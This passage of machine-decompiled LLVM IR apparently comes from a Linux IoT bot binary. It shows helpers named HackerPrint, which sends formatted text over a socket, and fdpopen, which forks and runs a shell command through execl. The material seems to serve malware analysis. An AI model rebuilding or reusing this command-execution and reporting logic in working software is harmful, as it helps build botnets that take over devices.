  %v2_8048651 = load i8, i8* %v23_8048646, align 1
  %v7_8048654 = icmp eq i8 %v2_8048651, 48
  br i1 %v7_8048654, label %dec_label_pc_8048646, label %dec_label_pc_804867b.preheader

dec_label_pc_804867b.preheader:                   ; preds = %dec_label_pc_8048646, %dec_label_pc_804864e.preheader
  %stack_var_8.0.lcssa = phi i8* [ %stack_var_8.0.ph, %dec_label_pc_804864e.preheader ], [ %v23_8048646, %dec_label_pc_8048646 ]
  %stack_var_-32.0.lcssa = phi i32 [ %stack_var_-32.0.ph, %dec_label_pc_804864e.preheader ], [ %v4_804864a, %dec_label_pc_8048646 ]
  %v4_804867b34 = ptrtoint i8* %stack_var_8.0.lcssa to i32
  %v2_804867e35 = load i8, i8* %stack_var_8.0.lcssa, align 1
  %tmp = icmp ult i8 %v2_804867e35, 48
  br i1 %tmp, label %dec_label_pc_804868f, label %dec_label_pc_8048685

dec_label_pc_804865a:                             ; preds = %dec_label_pc_8048685
  %v2_8048663 = mul i32 %stack_var_-36.046, 10
  %v2_804866b = load i8, i8* %stack_var_8.145, align 1
  %v3_804866b = zext i8 %v2_804866b to i32
  %v1_8048671 = add nsw i32 %v3_804866b, -48
  %v5_8048674 = add i32 %v1_8048671, %v2_8048663
  %v5_8048677 = add i32 %v4_804867b47, 1
  %v23_8048677 = inttoptr i32 %v5_8048677 to i8*
  %v2_804867e = load i8, i8* %v23_8048677, align 1
  %tmp70 = icmp ult i8 %v2_804867e, 48
  br i1 %tmp70, label %dec_label_pc_804868f, label %dec_label_pc_8048685

dec_label_pc_8048685:                             ; preds = %dec_label_pc_804867b.preheader, %dec_label_pc_804865a
  %v4_804867b47 = phi i32 [ %v5_8048677, %dec_label_pc_804865a ], [ %v4_804867b34, %dec_label_pc_804867b.preheader ]
  %stack_var_-36.046 = phi i32 [ %v5_8048674, %dec_label_pc_804865a ], [ 0, %dec_label_pc_804867b.preheader ]
  %stack_var_8.145 = phi i8* [ %v23_8048677, %dec_label_pc_804865a ], [ %stack_var_8.0.lcssa, %dec_label_pc_804867b.preheader ]
  %v2_8048688 = load i8, i8* %stack_var_8.145, align 1
  %tmp71 = icmp ult i8 %v2_8048688, 58
  br i1 %tmp71, label %dec_label_pc_804865a, label %dec_label_pc_804868f

dec_label_pc_804868f:                             ; preds = %dec_label_pc_804865a, %dec_label_pc_8048685, %dec_label_pc_804867b.preheader
  %stack_var_8.1.lcssa = phi i8* [ %stack_var_8.0.lcssa, %dec_label_pc_804867b.preheader ], [ %stack_var_8.145, %dec_label_pc_8048685 ], [ %v23_8048677, %dec_label_pc_804865a ]
  %stack_var_-36.0.lcssa = phi i32 [ 0, %dec_label_pc_804867b.preheader ], [ %stack_var_-36.046, %dec_label_pc_8048685 ], [ %v5_8048674, %dec_label_pc_804865a ]
  %v2_8048692 = load i8, i8* %stack_var_8.1.lcssa, align 1
  %v10_8048695 = icmp eq i8 %v2_8048692, 115
  %v1_8048697 = icmp eq i1 %v10_8048695, false
  br i1 %v1_8048697, label %dec_label_pc_80486e6, label %dec_label_pc_8048699

dec_label_pc_8048699:                             ; preds = %dec_label_pc_804868f
  %v1_804869c = add i32 %stack_var_12.161, 4
  %v1_80486a4 = inttoptr i32 %stack_var_12.161 to i32*
  %v2_80486a4 = load i32, i32* %v1_80486a4, align 4
  %v4_80486a9 = icmp eq i32 %v2_80486a4, 0
  br i1 %v4_80486a9, label %dec_label_pc_80486be, label %dec_label_pc_80486af

dec_label_pc_80486af:                             ; preds = %dec_label_pc_8048699
  %v5_80486b2 = inttoptr i32 %v2_80486a4 to i8*
  br label %dec_label_pc_80486be

dec_label_pc_80486be:                             ; preds = %dec_label_pc_8048699, %dec_label_pc_80486af
  %storemerge = phi i8* [ %v5_80486b2, %dec_label_pc_80486af ], [ getelementptr inbounds ([7 x i8], [7 x i8]* @global_var_8068597.21, i32 0, i32 0), %dec_label_pc_8048699 ]
  store i32 %stack_var_-36.0.lcssa, i32* @edx, align 4
  %v6_80486d9 = call i32 @prints(i32 %tmp6, i8* %storemerge, i32 %stack_var_-36.0.lcssa, i32 %stack_var_-32.0.lcssa)
  %v5_80486de = add i32 %v6_80486d9, %stack_var_-28.162
  br label %dec_label_pc_8048892

dec_label_pc_80486e6:                             ; preds = %dec_label_pc_804868f
  %v2_80486e9 = load i8, i8* %stack_var_8.1.lcssa, align 1
  %v10_80486ec = icmp eq i8 %v2_80486e9, 100
  %v1_80486ee = icmp eq i1 %v10_80486ec, false
  br i1 %v1_80486ee, label %dec_label_pc_804873a, label %dec_label_pc_80486f0

dec_label_pc_80486f0:                             ; preds = %dec_label_pc_80486e6
  %v1_80486f3 = add i32 %stack_var_12.161, 4
  %v1_80486fb = inttoptr i32 %stack_var_12.161 to i32*
  %v2_80486fb = load i32, i32* %v1_80486fb, align 4
  store i32 %stack_var_-36.0.lcssa, i32* @edx, align 4
  %v8_804872d = sext i32 %v2_80486fb to i64
  %v9_804872d = call i32 @printi(i32 %tmp6, i64 %v8_804872d, i32 10, i32 1, i32 %stack_var_-36.0.lcssa, i32 %stack_var_-32.0.lcssa, i32 97)
  %v5_8048732 = add i32 %v9_804872d, %stack_var_-28.162
  br label %dec_label_pc_8048892

dec_label_pc_804873a:                             ; preds = %dec_label_pc_80486e6
  %v2_804873d = load i8, i8* %stack_var_8.1.lcssa, align 1
  %v10_8048740 = icmp eq i8 %v2_804873d, 120
  %v1_8048742 = icmp eq i1 %v10_8048740, false
  br i1 %v1_8048742, label %dec_label_pc_804878e, label %dec_label_pc_8048744

dec_label_pc_8048744:                             ; preds = %dec_label_pc_804873a
  %v1_8048747 = add i32 %stack_var_12.161, 4
  %v1_804874f = inttoptr i32 %stack_var_12.161 to i32*
  %v2_804874f = load i32, i32* %v1_804874f, align 4
  store i32 %stack_var_-36.0.lcssa, i32* @edx, align 4
  %v8_8048781 = sext i32 %v2_804874f to i64
  %v9_8048781 = call i32 @printi(i32 %tmp6, i64 %v8_8048781, i32 16, i32 0, i32 %stack_var_-36.0.lcssa, i32 %stack_var_-32.0.lcssa, i32 97)
  %v5_8048786 = add i32 %v9_8048781, %stack_var_-28.162
  br label %dec_label_pc_8048892

dec_label_pc_804878e:                             ; preds = %dec_label_pc_804873a
  %v2_8048791 = load i8, i8* %stack_var_8.1.lcssa, align 1
  %v10_8048794 = icmp eq i8 %v2_8048791, 88
  %v1_8048796 = icmp eq i1 %v10_8048794, false
  br i1 %v1_8048796, label %dec_label_pc_80487e2, label %dec_label_pc_8048798

dec_label_pc_8048798:                             ; preds = %dec_label_pc_804878e
  %v1_804879b = add i32 %stack_var_12.161, 4
  %v1_80487a3 = inttoptr i32 %stack_var_12.161 to i32*
  %v2_80487a3 = load i32, i32* %v1_80487a3, align 4
  store i32 %stack_var_-36.0.lcssa, i32* @edx, align 4
  %v8_80487d5 = sext i32 %v2_80487a3 to i64
  %v9_80487d5 = call i32 @printi(i32 %tmp6, i64 %v8_80487d5, i32 16, i32 0, i32 %stack_var_-36.0.lcssa, i32 %stack_var_-32.0.lcssa, i32 65)
  %v5_80487da = add i32 %v9_80487d5, %stack_var_-28.162
  br label %dec_label_pc_8048892

dec_label_pc_80487e2:                             ; preds = %dec_label_pc_804878e
  %v2_80487e5 = load i8, i8* %stack_var_8.1.lcssa, align 1
  %v10_80487e8 = icmp eq i8 %v2_80487e5, 117
  %v1_80487ea = icmp eq i1 %v10_80487e8, false
  br i1 %v1_80487ea, label %dec_label_pc_8048833, label %dec_label_pc_80487ec

dec_label_pc_80487ec:                             ; preds = %dec_label_pc_80487e2
  %v1_80487ef = add i32 %stack_var_12.161, 4
  %v1_80487f7 = inttoptr i32 %stack_var_12.161 to i32*
  %v2_80487f7 = load i32, i32* %v1_80487f7, align 4
  store i32 %stack_var_-36.0.lcssa, i32* @edx, align 4
  %v8_8048829 = sext i32 %v2_80487f7 to i64
  %v9_8048829 = call i32 @printi(i32 %tmp6, i64 %v8_8048829, i32 10, i32 0, i32 %stack_var_-36.0.lcssa, i32 %stack_var_-32.0.lcssa, i32 97)
  %v5_804882e = add i32 %v9_8048829, %stack_var_-28.162
  br label %dec_label_pc_8048892

dec_label_pc_8048833:                             ; preds = %dec_label_pc_80487e2
  %v2_8048836 = load i8, i8* %stack_var_8.1.lcssa, align 1
  %v10_8048839 = icmp eq i8 %v2_8048836, 99
  %v1_804883b = icmp eq i1 %v10_8048839, false
  br i1 %v1_804883b, label %dec_label_pc_8048892, label %dec_label_pc_804883d

dec_label_pc_804883d:                             ; preds = %dec_label_pc_8048833
  %v1_8048840 = add i32 %stack_var_12.161, 4
  %v1_8048848 = inttoptr i32 %stack_var_12.161 to i32*
  %v2_8048848 = load i32, i32* %v1_8048848, align 4
  store i32 %v2_8048848, i32* %stack_var_-6, align 4
  store i32 %stack_var_-36.0.lcssa, i32* @edx, align 4
  %v6_804886c = call i32 @prints(i32 %tmp6, i8* %tmp21, i32 %stack_var_-36.0.lcssa, i32 %stack_var_-32.0.lcssa)
  %v5_8048871 = add i32 %v6_804886c, %stack_var_-28.162
  br label %dec_label_pc_8048892

dec_label_pc_8048876:                             ; preds = %dec_label_pc_8048621, %dec_label_pc_80485f4
  %stack_var_8.2 = phi i8* [ %stack_var_8.463, %dec_label_pc_80485f4 ], [ %v23_8048602, %dec_label_pc_8048621 ]
  %v2_8048879 = load i8, i8* %stack_var_8.2, align 1
  %v3_8048879 = zext i8 %v2_8048879 to i32
  %v4_8048889 = call i32 @printchar(i32* %arg1, i32 %v3_8048879)
  %v4_804888e = add i32 %stack_var_-28.162, 1
  br label %dec_label_pc_8048892

dec_label_pc_8048892:                             ; preds = %dec_label_pc_8048833, %dec_label_pc_804883d, %dec_label_pc_80487ec, %dec_label_pc_8048798, %dec_label_pc_8048744, %dec_label_pc_80486f0, %dec_label_pc_80486be, %dec_label_pc_8048876
  %stack_var_8.3 = phi i8* [ %stack_var_8.2, %dec_label_pc_8048876 ], [ %stack_var_8.1.lcssa, %dec_label_pc_8048833 ], [ %stack_var_8.1.lcssa, %dec_label_pc_804883d ], [ %stack_var_8.1.lcssa, %dec_label_pc_80487ec ], [ %stack_var_8.1.lcssa, %dec_label_pc_8048798 ], [ %stack_var_8.1.lcssa, %dec_label_pc_8048744 ], [ %stack_var_8.1.lcssa, %dec_label_pc_80486f0 ], [ %stack_var_8.1.lcssa, %dec_label_pc_80486be ]
  %stack_var_12.0 = phi i32 [ %stack_var_12.161, %dec_label_pc_8048876 ], [ %stack_var_12.161, %dec_label_pc_8048833 ], [ %v1_8048840, %dec_label_pc_804883d ], [ %v1_80487ef, %dec_label_pc_80487ec ], [ %v1_804879b, %dec_label_pc_8048798 ], [ %v1_8048747, %dec_label_pc_8048744 ], [ %v1_80486f3, %dec_label_pc_80486f0 ], [ %v1_804869c, %dec_label_pc_80486be ]
  %stack_var_-28.0 = phi i32 [ %v4_804888e, %dec_label_pc_8048876 ], [ %stack_var_-28.162, %dec_label_pc_8048833 ], [ %v5_8048871, %dec_label_pc_804883d ], [ %v5_804882e, %dec_label_pc_80487ec ], [ %v5_80487da, %dec_label_pc_8048798 ], [ %v5_8048786, %dec_label_pc_8048744 ], [ %v5_8048732, %dec_label_pc_80486f0 ], [ %v5_80486de, %dec_label_pc_80486be ]
  %v4_8048892 = ptrtoint i8* %stack_var_8.3 to i32
  %v5_8048892 = add i32 %v4_8048892, 1
  %stack_var_8.4 = inttoptr i32 %v5_8048892 to i8*
  %v2_8048899 = load i8, i8* %stack_var_8.4, align 1
  %v4_804889c = icmp eq i8 %v2_8048899, 0
  %v1_804889e = icmp eq i1 %v4_804889c, false
  br i1 %v1_804889e, label %dec_label_pc_80485f4, label %dec_label_pc_80488a4

dec_label_pc_80488a4:                             ; preds = %dec_label_pc_8048892, %dec_label_pc_8048602, %entry
  %stack_var_-28.1.lcssa = phi i32 [ 0, %entry ], [ %stack_var_-28.162, %dec_label_pc_8048602 ], [ %stack_var_-28.0, %dec_label_pc_8048892 ]
  %v4_80488a4 = icmp eq i32* %arg1, null
  br i1 %v4_80488a4, label %dec_label_pc_80488b2, label %dec_label_pc_80488aa

dec_label_pc_80488aa:                             ; preds = %dec_label_pc_80488a4
  %v2_80488ad = load i32, i32* %arg1, align 4
  %v1_80488af = inttoptr i32 %v2_80488ad to i8*
  store i8 0, i8* %v1_80488af, align 1
  br label %dec_label_pc_80488b2

dec_label_pc_80488b2:                             ; preds = %dec_label_pc_80488a4, %dec_label_pc_80488aa
  %v2_80488b5 = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_80488b5, i32* @ebp, align 4
  ret i32 %stack_var_-28.1.lcssa

; uselistorder directives
  uselistorder i8* %stack_var_8.4, { 1, 0 }
  uselistorder i32 %v5_8048892, { 1, 0 }
  uselistorder i32 %stack_var_-36.0.lcssa, { 1, 0, 3, 2, 5, 4, 7, 6, 9, 8, 10, 11 }
  uselistorder i8* %stack_var_8.1.lcssa, { 12, 11, 10, 9, 8, 7, 6, 5, 4, 3, 2, 1, 0 }
  uselistorder i32 %v5_8048646, { 1, 0 }
  uselistorder i8* %v23_8048602, { 2, 0, 1, 3, 4 }
  uselistorder i32 %stack_var_8.4.in60, { 1, 0 }
  uselistorder i32 %stack_var_12.161, { 1, 0, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13 }
  uselistorder i32 %stack_var_-28.162, { 0, 2, 1, 8, 7, 6, 5, 4, 3 }
  uselistorder i32* %stack_var_-6, { 1, 0 }
  uselistorder i32 %tmp6, { 5, 4, 3, 2, 1, 0 }
  uselistorder i32 (i32, i8*, i32, i32)* @prints, { 0, 3, 1, 2 }
  uselistorder i32* %arg1, { 1, 2, 0, 3 }
  uselistorder label %dec_label_pc_80488b2, { 1, 0 }
  uselistorder label %dec_label_pc_8048892, { 7, 1, 0, 2, 3, 4, 5, 6 }
  uselistorder label %dec_label_pc_80486be, { 1, 0 }
  uselistorder label %dec_label_pc_804868f, { 1, 0, 2 }
  uselistorder label %dec_label_pc_8048685, { 1, 0 }
  uselistorder label %dec_label_pc_8048646, { 1, 0 }
  uselistorder label %dec_label_pc_80485f4, { 1, 0 }
}

define i32 @zprintf(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %stack_var_8 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_80488b7 = load i32, i32* @ebp, align 4
  store i32 %v0_80488b7, i32* %stack_var_-4, align 4
  %v4_80488b7 = ptrtoint i32* %stack_var_-4 to i32
  store i32 %v4_80488b7, i32* @ebp, align 4
  %v4_80488c0 = ptrtoint i32* %stack_var_8 to i32
  %v4_80488d8 = call i32 @print(i32* null, i32 %arg1, i32 %v4_80488c0)
  %v2_80488dd = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_80488dd, i32* @ebp, align 4
  ret i32 %v4_80488d8

; uselistorder directives
  uselistorder i32* %stack_var_-4, { 0, 2, 1 }
}

define i32 @szprintf(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %stack_var_4 = alloca i32, align 4
  %stack_var_12 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_80488df = load i32, i32* @ebp, align 4
  store i32 %v0_80488df, i32* %stack_var_-4, align 4
  %v4_80488df = ptrtoint i32* %stack_var_-4 to i32
  store i32 %v4_80488df, i32* @ebp, align 4
  %v4_80488e8 = ptrtoint i32* %stack_var_12 to i32
  %v4_80488ff = call i32 @print(i32* nonnull %stack_var_4, i32 %arg1, i32 %v4_80488e8)
  %v2_8048904 = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_8048904, i32* @ebp, align 4
  ret i32 %v4_80488ff

; uselistorder directives
  uselistorder i32* %stack_var_-4, { 0, 2, 1 }
}

define i32 @HackerPrint(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %stack_var_-16 = alloca i32, align 4
  %stack_var_12 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_8048906 = load i32, i32* @ebp, align 4
  store i32 %v0_8048906, i32* %stack_var_-4, align 4
  %v4_8048906 = ptrtoint i32* %stack_var_-4 to i32
  store i32 %v4_8048906, i32* @ebp, align 4
  %v2_8048913 = call i32 @malloc(i32 2048)
  store i32 %v2_8048913, i32* %stack_var_-16, align 4
  %v4_804892e = inttoptr i32 %v2_8048913 to i8*
  %v5_8048931 = call i32 @__GI_memset(i8* %v4_804892e, i32 0, i32 2048)
  %v4_804893f = ptrtoint i32* %stack_var_12 to i32
  %v5_8048956 = call i32 @print(i32* nonnull %stack_var_-16, i32 %arg2, i32 %v4_804893f)
  %v3_8048961 = call i32 @strlen(i8* %v4_804892e)
  %v6_8048966 = add i32 %v3_8048961, %v2_8048913
  %v1_8048969 = inttoptr i32 %v6_8048966 to i8*
  store i8 10, i8* %v1_8048969, align 1
  %v3_804897b = call i32 @zprintf(i32 ptrtoint ([9 x i8]* @global_var_806859e.22 to i32), i32 %v2_8048913)
  %v3_8048986 = call i32 @strlen(i8* %v4_804892e)
  %v5_80489a4 = call i32 @__libc_send(i32 %arg1, i32 %v2_8048913, i32 %v3_8048986, i32 16384)
  %v2_80489b2 = call i32 @free(i32 %v2_8048913)
  %v2_80489ba = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_80489ba, i32* @ebp, align 4
  ret i32 %v5_80489a4

; uselistorder directives
  uselistorder i8* %v4_804892e, { 1, 0, 2 }
  uselistorder i32 %v2_8048913, { 1, 2, 3, 0, 4, 5 }
  uselistorder i32* %stack_var_-4, { 0, 2, 1 }
}

define i32 @fdpopen(i32 %arg1, i8* %arg2) local_unnamed_addr {
entry:
  %tmp = call i32 @__decompiler_undefined_function_0()
  %tmp5 = call i32 @__decompiler_undefined_function_0()
  %tmp11 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-20 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_80489bc = load i32, i32* @ebp, align 4
  store i32 %v0_80489bc, i32* %stack_var_-4, align 4
  %v4_80489bc = ptrtoint i32* %stack_var_-4 to i32
  store i32 %v4_80489bc, i32* @ebp, align 4
  %v4_80489c2 = ptrtoint i8* %arg2 to i32
  %v2_80489c5 = load i8, i8* %arg2, align 1
  %v10_80489c8 = icmp eq i8 %v2_80489c5, 114
  br i1 %v10_80489c8, label %dec_label_pc_80489d6, label %dec_label_pc_80489cc

dec_label_pc_80489cc:                             ; preds = %entry
  %v2_80489cf = load i8, i8* %arg2, align 1
  %v10_80489d2 = icmp eq i8 %v2_80489cf, 119
  %v1_80489d4 = icmp eq i1 %v10_80489d2, false
  br i1 %v1_80489d4, label %dec_label_pc_8048ba2, label %dec_label_pc_80489d6

dec_label_pc_80489d6:                             ; preds = %dec_label_pc_80489cc, %entry
  %v1_80489d9 = add i32 %v4_80489c2, 1
  %v1_80489dc = inttoptr i32 %v1_80489d9 to i8*
  %v2_80489dc = load i8, i8* %v1_80489dc, align 1
  %v4_80489df = icmp eq i8 %v2_80489dc, 0
  br i1 %v4_80489df, label %dec_label_pc_80489ef, label %dec_label_pc_8048ba2

dec_label_pc_80489ef:                             ; preds = %dec_label_pc_80489d6
  %v2_80489ef = ptrtoint i32* %stack_var_-20 to i32
  %v1_80489f5 = call i32 @__GI_pipe(i32 %v2_80489ef)
  %v2_80489fa = icmp slt i32 %v1_80489f5, 0
  %v1_80489fc = icmp eq i1 %v2_80489fa, false
  br i1 %v1_80489fc, label %dec_label_pc_8048a0a, label %dec_label_pc_8048ba2

dec_label_pc_8048a0a:                             ; preds = %dec_label_pc_80489ef
  %v0_8048a0a = load i32, i32* @global_var_8075b60.23, align 32
  %v1_8048a0f = icmp eq i32 %v0_8048a0a, 0
  %v1_8048a11 = icmp eq i1 %v1_8048a0f, false
  br i1 %v1_8048a11, label %dec_label_pc_8048a75, label %dec_label_pc_8048a13

dec_label_pc_8048a13:                             ; preds = %dec_label_pc_8048a0a
  %v2_8048a13 = call i32 @getdtablesize(i32 %tmp11, i32 %tmp)
  %tmp17 = icmp slt i32 %v2_8048a13, 1
  %tmp18 = icmp eq i1 %tmp17, false
  br i1 %tmp18, label %dec_label_pc_8048a2d, label %dec_label_pc_8048ba2

dec_label_pc_8048a2d:                             ; preds = %dec_label_pc_8048a13
  %v2_8048a30 = mul i32 %v2_8048a13, 4
  %v1_8048a36 = call i32 @malloc(i32 %v2_8048a30)
  store i32 %v1_8048a36, i32* @global_var_8075b60.23, align 32
  %v1_8048a45 = icmp eq i32 %v1_8048a36, 0
  %v1_8048a47 = icmp eq i1 %v1_8048a45, false
  br i1 %v1_8048a47, label %dec_label_pc_8048a55, label %dec_label_pc_8048ba2

dec_label_pc_8048a55:                             ; preds = %dec_label_pc_8048a2d
  %v5_8048a70 = inttoptr i32 %v1_8048a36 to i8*
  %v6_8048a70 = call i32 @__GI_memset(i8* %v5_8048a70, i32 0, i32 %v2_8048a30)
  br label %dec_label_pc_8048a75

dec_label_pc_8048a75:                             ; preds = %dec_label_pc_8048a0a, %dec_label_pc_8048a55
  %v0_8048a75 = call i32 @__vfork()
  %v13_8048a83 = icmp eq i32 %v0_8048a75, -1
  br i1 %v13_8048a83, label %dec_label_pc_8048a94, label %dec_label_pc_8048a89

dec_label_pc_8048a89:                             ; preds = %dec_label_pc_8048a75
  %v4_8048a89 = icmp eq i32 %v0_8048a75, 0
  br i1 %v4_8048a89, label %dec_label_pc_8048ab6, label %dec_label_pc_8048b5a

dec_label_pc_8048a94:                             ; preds = %dec_label_pc_8048a75
  %v3_8048a94 = load i32, i32* %stack_var_-20, align 4
  store i32 %v3_8048a94, i32* @eax, align 4
  %v1_8048a9a = call i32 @__GI___libc_close(i32 %v3_8048a94)
  store i32 %tmp5, i32* @eax, align 4
  %v1_8048aa5 = call i32 @__GI___libc_close(i32 %tmp5)
  br label %dec_label_pc_8048ba2

dec_label_pc_8048ab6:                             ; preds = %dec_label_pc_8048a89
  %v2_8048ab9 = load i8, i8* %arg2, align 1
  %v10_8048abc = icmp eq i8 %v2_8048ab9, 114
  %v1_8048abe = icmp eq i1 %v10_8048abc, false
  br i1 %v1_8048abe, label %dec_label_pc_8048af3, label %dec_label_pc_8048ac0

dec_label_pc_8048ac0:                             ; preds = %dec_label_pc_8048ab6
  %v9_8048ac3 = icmp eq i32 %tmp5, 1
  br i1 %v9_8048ac3, label %dec_label_pc_8048ae6, label %dec_label_pc_8048ac8

dec_label_pc_8048ac8:                             ; preds = %dec_label_pc_8048ac0
  %v3_8048ad6 = call i32 @dup2(i32 %tmp5, i32 1)
  store i32 %tmp5, i32* @eax, align 4
  %v1_8048ae1 = call i32 @__GI___libc_close(i32 %tmp5)
  br label %dec_label_pc_8048ae6

dec_label_pc_8048ae6:                             ; preds = %dec_label_pc_8048ac0, %dec_label_pc_8048ac8
  %v3_8048ae6 = load i32, i32* %stack_var_-20, align 4
  store i32 %v3_8048ae6, i32* @eax, align 4
  %v1_8048aec = call i32 @__GI___libc_close(i32 %v3_8048ae6)
  br label %dec_label_pc_8048b23

dec_label_pc_8048af3:                             ; preds = %dec_label_pc_8048ab6
  %v3_8048af3 = load i32, i32* %stack_var_-20, align 4
  %v1_8048af6 = icmp eq i32 %v3_8048af3, 0
  br i1 %v1_8048af6, label %dec_label_pc_8048b18, label %dec_label_pc_8048afa

dec_label_pc_8048afa:                             ; preds = %dec_label_pc_8048af3
  %v3_8048b08 = call i32 @dup2(i32 %v3_8048af3, i32 0)
  %v3_8048b0d = load i32, i32* %stack_var_-20, align 4
  store i32 %v3_8048b0d, i32* @eax, align 4
  %v1_8048b13 = call i32 @__GI___libc_close(i32 %v3_8048b0d)
  br label %dec_label_pc_8048b18

dec_label_pc_8048b18:                             ; preds = %dec_label_pc_8048af3, %dec_label_pc_8048afa
  store i32 %tmp5, i32* @eax, align 4
  %v1_8048b1e = call i32 @__GI___libc_close(i32 %tmp5)
  br label %dec_label_pc_8048b23

dec_label_pc_8048b23:                             ; preds = %dec_label_pc_8048ae6, %dec_label_pc_8048b18
  %v7_8048b49 = call i32 @execl(i32 ptrtoint ([8 x i8]* @global_var_80685ad.26 to i32), i32 ptrtoint ([3 x i8]* @global_var_80685aa.25 to i32), i32 ptrtoint ([3 x i8]* @global_var_80685a7.24 to i32), i32 %arg1, i32 0)
  %v1_8048b55 = call i32 @__GI__exit(i32 127)
  br label %dec_label_pc_8048b5a

dec_label_pc_8048b5a:                             ; preds = %dec_label_pc_8048a89, %dec_label_pc_8048b23
  %v2_8048b5d = load i8, i8* %arg2, align 1
  %v10_8048b60 = icmp eq i8 %v2_8048b5d, 114
  %v1_8048b62 = icmp eq i1 %v10_8048b60, false
  br i1 %v1_8048b62, label %dec_label_pc_8048b77, label %dec_label_pc_8048b64

dec_label_pc_8048b64:                             ; preds = %dec_label_pc_8048b5a
  %v3_8048b64 = load i32, i32* %stack_var_-20, align 4
  store i32 %tmp5, i32* @eax, align 4
  %v1_8048b70 = call i32 @__GI___libc_close(i32 %tmp5)
  br label %dec_label_pc_8048b88

dec_label_pc_8048b77:                             ; preds = %dec_label_pc_8048b5a
  %v3_8048b7d = load i32, i32* %stack_var_-20, align 4
  store i32 %v3_8048b7d, i32* @eax, align 4
  %v1_8048b83 = call i32 @__GI___libc_close(i32 %v3_8048b7d)
  br label %dec_label_pc_8048b88

dec_label_pc_8048b88:                             ; preds = %dec_label_pc_8048b64, %dec_label_pc_8048b77
  %stack_var_-24.0 = phi i32 [ %tmp5, %dec_label_pc_8048b77 ], [ %v3_8048b64, %dec_label_pc_8048b64 ]
  %v2_8048b8b = mul i32 %stack_var_-24.0, 4
  %v0_8048b90 = load i32, i32* @global_var_8075b60.23, align 32
  %v2_8048b95 = add i32 %v0_8048b90, %v2_8048b8b
  %v2_8048b9a = inttoptr i32 %v2_8048b95 to i32*
  store i32 %v0_8048a75, i32* %v2_8048b9a, align 4
  br label %dec_label_pc_8048ba2

dec_label_pc_8048ba2:                             ; preds = %dec_label_pc_8048a2d, %dec_label_pc_8048a13, %dec_label_pc_80489ef, %dec_label_pc_80489cc, %dec_label_pc_80489d6, %dec_label_pc_8048a94, %dec_label_pc_8048b88
  %stack_var_-28.0 = phi i32 [ -1, %dec_label_pc_8048a94 ], [ %stack_var_-24.0, %dec_label_pc_8048b88 ], [ -1, %dec_label_pc_80489d6 ], [ -1, %dec_label_pc_80489cc ], [ -1, %dec_label_pc_80489ef ], [ -1, %dec_label_pc_8048a13 ], [ -1, %dec_label_pc_8048a2d ]
  %v2_8048ba5 = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_8048ba5, i32* @ebp, align 4
  ret i32 %stack_var_-28.0

; uselistorder directives
  uselistorder i32 %stack_var_-24.0, { 1, 0 }
  uselistorder i32 %v0_8048a75, { 1, 2, 0 }
  uselistorder i32 %v2_8048a30, { 1, 0 }
  uselistorder i32* %stack_var_-4, { 0, 2, 1 }
  uselistorder i32 %tmp5, { 1, 10, 9, 8, 7, 6, 5, 4, 0, 3, 2 }
  uselistorder i8* %arg2, { 0, 1, 2, 4, 3 }
  uselistorder label %dec_label_pc_8048ba2, { 6, 5, 0, 1, 2, 4, 3 }
  uselistorder label %dec_label_pc_8048b88, { 1, 0 }
  uselistorder label %dec_label_pc_8048b5a, { 1, 0 }
  uselistorder label %dec_label_pc_8048b23, { 1, 0 }
  uselistorder label %dec_label_pc_8048b18, { 1, 0 }
  uselistorder label %dec_label_pc_8048ae6, { 1, 0 }
  uselistorder label %dec_label_pc_8048a75, { 1, 0 }
}

define i32 @fdpclose(i32 %arg1) local_unnamed_addr {
entry:
  %tmp6 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-28 = alloca i32, align 4
  %stack_var_-16 = alloca i32, align 4
  %stack_var_-24 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_8048ba7 = load i32, i32* @ebp, align 4
  store i32 %v0_8048ba7, i32* %stack_var_-4, align 4
  %v0_8048bad = load i32, i32* @global_var_8075b60.23, align 32
  %v1_8048bb2 = icmp eq i32 %v0_8048bad, 0
  br i1 %v1_8048bb2, label %dec_label_pc_8048cdb, label %dec_label_pc_8048bb6

dec_label_pc_8048bb6:                             ; preds = %entry
  %v2_8048bb9 = mul i32 %arg1, 4
  %v2_8048bc3 = add i32 %v0_8048bad, %v2_8048bb9
  %v1_8048bc6 = inttoptr i32 %v2_8048bc3 to i32*
  %v2_8048bc6 = load i32, i32* %v1_8048bc6, align 4
  %v1_8048bc8 = icmp eq i32 %v2_8048bc6, 0
  %v1_8048bca = icmp eq i1 %v1_8048bc8, false
  br i1 %v1_8048bca, label %dec_label_pc_8048bd8, label %dec_label_pc_8048cdb

dec_label_pc_8048bd8:                             ; preds = %dec_label_pc_8048bb6
  store i32 %arg1, i32* @eax, align 4
  %v1_8048bde = call i32 @__GI___libc_close(i32 %arg1)
  %v2_8048be3 = ptrtoint i32* %stack_var_-24 to i32
  %v2_8048be9 = call i32 @sigemptyset(i32* nonnull %stack_var_-24)
  %v2_8048bfc = call i32 @__GI_sigaddset(i32 %v2_8048be3, i32 2)
  %v2_8048c0f = call i32 @__GI_sigaddset(i32 %v2_8048be3, i32 3)
  %v2_8048c22 = call i32 @__GI_sigaddset(i32 %v2_8048be3, i32 1)
  %v4_8048c2a = ptrtoint i32* %stack_var_-16 to i32
  %v3_8048c3c = bitcast i32* %stack_var_-24 to %_TYPEDEF_sigset_t*
  %v4_8048c3c = call i32 @__GI_sigprocmask(i32 0, %_TYPEDEF_sigset_t* %v3_8048c3c, i32 %v4_8048c2a)
  %v2_8048c5b = ptrtoint i32* %stack_var_-28 to i32
  br label %dec_label_pc_8048c41

dec_label_pc_8048c41:                             ; preds = %dec_label_pc_8048c73, %dec_label_pc_8048bd8
  %v0_8048c49 = load i32, i32* @global_var_8075b60.23, align 32
